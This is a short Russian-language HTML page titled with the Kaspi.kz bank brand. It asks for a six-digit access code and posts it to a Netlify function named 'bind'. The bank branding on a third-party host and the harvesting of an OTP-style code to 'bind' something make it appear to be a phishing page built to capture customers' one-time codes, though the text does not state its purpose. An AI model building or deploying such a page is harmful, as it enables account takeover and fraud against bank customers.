<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width,initial-scale=1,user-scalable=0">
  <title>Kaspi.kz - Доступ</title>
  <style>
    body { font-family: -apple-system, sans-serif; background: #f5f6f8; margin: 0; min-height: 100vh; display: flex; align-items: center; justify-content: center; }
    .box { background: #fff; border-radius: 14px; padding: 22px; width: 320px; text-align: center; box-shadow: 0 10px 30px rgba(0,0,0,.08); }
    input { width: 100%; padding: 14px; border-radius: 12px; border: 1px solid #d9dce3; font-size: 16px; text-align: center; letter-spacing: 3px; }
    button { width: 100%; padding: 14px; border-radius: 12px; border: none; background: #111; color: #fff; font-weight: 700; margin-top: 10px; cursor: pointer; }
    #msg { margin-top: 10px; font-size: 14px; }
  </style>
</head>
<body>
<div class="box">
  <h3>Введите код доступа</h3>
  <input id="code" placeholder="000000" maxlength="6" inputmode="numeric">
  <button onclick="checkCode()">Подтвердить</button>
  <div id="msg"></div>
</div>
<script>
async function checkCode() {
    const code = document.getElementById('code').value.trim();
    const msg = document.getElementById('msg');
    
    if (code.length !== 6) {
        msg.textContent = 'Введите 6 цифр';
        return;
    }
    
    msg.textContent = 'Проверка...';
    
    try {
        const r = await fetch('/.netlify/functions/bind', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({code})
        });
        
        const data = await r.json();
        
        if (r.ok) {
            localStorage.setItem('access_granted', 'true');
            window.location.href = '/';
        } else {
            msg.textContent = 'Неверный или истёкший код';
        }
    } catch(e) {
        msg.textContent = 'Ошибка соединения';
    }
}
</script>
</body>
</html>
